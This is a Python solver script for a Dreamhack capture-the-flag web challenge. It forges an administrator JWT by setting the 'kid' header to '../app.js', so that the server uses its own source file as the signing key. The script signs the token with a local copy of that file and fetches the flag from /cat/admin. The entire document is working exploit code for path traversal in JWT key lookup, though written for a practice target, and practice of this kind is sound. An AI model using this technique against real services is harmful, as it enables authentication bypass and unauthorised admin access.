import requests
import jwt

URL = "http://host1.dreamhack.games:14508" # TODO: 현재 포트 번호로 꼭 변경하세요!

print("\n[*] 2. 관리자 JWT 위조 시작 (app.js 내용 기반)...")

# 서버의 /home/cat/deploy/app.js 를 키로 사용하도록 유도
header = {
    "alg": "HS256", 
    "typ": "JWT", 
    "kid": "../app.js" 
}
payload = {
    "username": "cat_master"
}

# 로컬의 app.js 파일을 읽어서 시크릿 키로 사용 (윈도우 줄바꿈 \r\n을 리눅스 \n으로 변환)
try:
    with open("app.js", "r", encoding="utf-8") as f:
        secret_key = f.read().replace("\r\n", "\n")
except FileNotFoundError:
    print("[-] 에러: 실행 폴더에 app.js 파일이 없습니다. 파일을 옮겨주세요.")
    exit()

# app.js 파일의 내용을 통째로 시크릿 키 삼아 직접 서명!
forged_token = jwt.encode(payload, secret_key, algorithm="HS256", headers=header)

# 두 번째 플래그 요청
cookies_2 = {"session": forged_token}
res_flag2 = requests.get(f"{URL}/cat/admin", cookies=cookies_2)

print(f"FLAG 2: {res_flag2.text}")